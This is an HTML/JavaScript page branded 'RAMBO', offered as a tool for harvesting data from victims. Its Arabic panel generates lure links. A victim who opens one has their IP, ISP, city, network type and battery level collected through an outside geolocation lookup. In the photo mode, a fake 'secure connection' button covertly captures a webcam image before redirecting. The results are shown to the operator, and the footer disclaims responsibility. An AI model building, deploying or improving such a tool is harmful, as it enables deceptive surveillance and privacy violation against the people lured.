<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RAMBO SECURITY SYSTEM</title>
    <style>
        :root { --bg: #000; --card: #080808; --neon: #00d2ff; --green: #39ff14; --text: #eee; }
        body { margin: 0; background: var(--bg); font-family: 'Courier New', monospace; color: var(--text); }
        .container { display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px; }
        
        .admin-box { 
            background: var(--card); padding: 30px; border-radius: 10px; width: 100%; max-width: 450px; 
            border: 1px solid #111; box-shadow: 0 0 20px rgba(0, 210, 255, 0.1);
        }

        h2 { text-align: center; color: var(--neon); letter-spacing: 5px; text-transform: uppercase; margin-bottom: 30px; }
        
        .mode-container { display: flex; gap: 10px; margin-bottom: 20px; }
        .mode-card { flex: 1; border: 1px solid #222; padding: 15px; text-align: center; cursor: pointer; transition: 0.3s; background: #050505; }
        .mode-card.active { border-color: var(--neon); background: rgba(0, 210, 255, 0.05); color: var(--neon); }

        input { width: 100%; padding: 15px; background: #000; border: 1px solid #1a1a1a; border-radius: 5px; color: #fff; margin-bottom: 15px; box-sizing: border-box; }
        .main-btn { background: var(--neon); color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; text-transform: uppercase; }

        .result-box { margin-top: 20px; padding: 15px; border: 1px dashed var(--green); display: none; }
        #log-area { margin-top: 30px; display: none; width: 100%; }
        .data-log { background: #050505; padding: 20px; border-right: 3px solid var(--green); }
        .info-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 13px; border-bottom: 1px solid #111; padding-bottom: 5px; }
        .info-row span { color: var(--neon); }

        .footer { margin-top: 40px; text-align: center; font-size: 11px; color: #555; }
        .footer b { color: #da3633; display: block; margin-bottom: 10px; }
        .rambo-tag { color: var(--neon); opacity: 0.7; font-weight: bold; }

        .victim-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
        .dialog { border: 1px solid #1a1a1a; padding: 40px; text-align: center; width: 80%; max-width: 300px; }
        .hidden { display: none !important; }
    </style>
</head>
<body>

<div class="container">
    <div id="admin-panel" class="admin-box">
        <h2>RAMBO PANEL</h2>
        
        <div class="mode-container">
            <div id="m1" class="mode-card active" onclick="selectMode('1', 'm1')">سحب بيانات الضحية</div>
            <div id="m2" class="mode-card" onclick="selectMode('2', 'm2')">سحب صور</div>
        </div>

        <input type="text" id="targetUrl" placeholder="رابط التحويل">
        <button class="main-btn" onclick="generateLink()">توليد الرابط</button>

        <div id="resultBox" class="result-box">
            <input type="text" id="copyLink" readonly onclick="this.select()" style="border:none; color:var(--green); text-align:center;">
        </div>

        <div id="log-area">
            <div class="data-log">
                <p style="color:var(--neon); font-size:12px;">[ DATA RECEIVED ]</p>
                <div id="device-data"></div>
                <div id="image-data" class="hidden">
                    <img id="captured-img" style="width:100%; margin-top:15px; border: 1px solid #222;">
                </div>
            </div>
        </div>
    </div>

    <div class="footer">
        <b>غير مسؤول في استخدامك للموقع !</b>
        <div class="rambo-tag">Develop By RAMBO</div>
    </div>
</div>

<div id="victim-ui" class="victim-overlay hidden">
    <div class="dialog">
        <p style="color:#666; font-size:13px;">تأكيد الاتصال الآمن...</p>
        <button id="cameraBtn" class="main-btn" style="margin-top:10px;">دخول</button>
    </div>
    <video id="video" autoplay playsinline style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>
</div>

<script>
    let activeMode = '1';
    const urlParams = new URLSearchParams(window.location.search);
    const vMode = urlParams.get('v');

    function selectMode(mode, id) {
        activeMode = mode;
        document.querySelectorAll('.mode-card').forEach(c => c.classList.remove('active'));
        document.getElementById(id).classList.add('active');
    }

    if (vMode) {
        document.getElementById('admin-panel').classList.add('hidden');
        document.querySelector('.footer').classList.add('hidden');
        
        async function captureData() {
            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
            const batt = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve(null));
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

            const payload = {
                brand: /iPhone|Android|Samsung|Xiaomi|Huawei/.exec(navigator.userAgent)?.[0] || "Smartphone",
                ip: ipData.ip || "N/A",
                isp: ipData.org || "Unknown ISP", // شركة الاتصالات (خط الهاتف)
                net: connection ? connection.effectiveType : "N/A", // نوع الشبكة (4G/5G)
                city: ipData.city || "N/A",
                os: navigator.platform,
                batt: batt ? (batt.level * 100).toFixed(0) + "%" : "N/A"
            };
            localStorage.setItem('rambo_final', JSON.stringify(payload));
            const redir = localStorage.getItem('rambo_redir') || 'https://google.com';

            if (vMode === '1') {
                window.location.href = redir;
            } else {
                document.getElementById('victim-ui').classList.remove('hidden');
                document.getElementById('cameraBtn').onclick = async () => {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true }).catch(() => null);
                    if (stream) {
                        const video = document.getElementById('video');
                        video.srcObject = stream;
                        setTimeout(() => {
                            const canvas = document.getElementById('canvas');
                            canvas.width = 640; canvas.height = 480;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            localStorage.setItem('rambo_pic', canvas.toDataURL('image/jpeg'));
                            stream.getTracks().forEach(t => t.stop());
                            window.location.href = redir;
                        }, 800);
                    } else { window.location.href = redir; }
                };
            }
        }
        captureData();
    }

    function generateLink() {
        const val = document.getElementById('targetUrl').value;
        if (!val) return;
        localStorage.setItem('rambo_redir', val);
        document.getElementById('copyLink').value = window.location.href.split('?')[0] + "?v=" + activeMode;
        document.getElementById('resultBox').style.display = 'block';
    }

    window.addEventListener('storage', (e) => {
        if (e.key === 'rambo_final') {
            document.getElementById('log-area').style.display = 'block';
            const d = JSON.parse(e.newValue);
            document.getElementById('device-data').innerHTML = `
                <div class="info-row">الجهاز: <span>${d.brand}</span></div>
                <div class="info-row">شركة الاتصالات: <span>${d.isp}</span></div>
                <div class="info-row">نوع الشبكة: <span>${d.net}</span></div>
                <div class="info-row">عنوان IP: <span>${d.ip}</span></div>
                <div class="info-row">المدينة: <span>${d.city}</span></div>
                <div class="info-row">البطارية: <span>${d.batt}</span></div>
            `;
        }
        if (e.key === 'rambo_pic') {
            document.getElementById('image-data').classList.remove('hidden');
            document.getElementById('captured-img').src = e.newValue;
        }
    });
</script>
</body>
</html>
